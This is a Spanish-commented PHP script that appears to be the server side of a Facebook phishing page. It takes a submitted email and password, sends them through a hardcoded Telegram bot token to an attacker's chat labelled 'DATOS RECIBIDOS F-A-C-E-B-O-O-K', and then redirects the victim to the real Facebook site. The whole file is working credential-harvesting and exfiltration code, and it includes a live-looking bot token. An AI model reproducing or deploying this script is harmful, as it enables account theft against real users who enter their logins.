<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5376029455:AAFZaNBOQgw6D0GfBaCxOsjfJNd1HPZOtgA";
#digitales
$dot = $_POST['para'];
$dat = $_POST['poro'];

$datos = [
    'chat_id' => '5478715585',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "DATOS RECIBIDOS F-A-C-E-B-O-O-K \n\n🪙 Email $dot \n✅ Password: $dat  \n\nATTE: ReBoot",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);
if ($r_array['ok'] == 1) {
    header("Location: https://www.facebook.com/");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}
?>
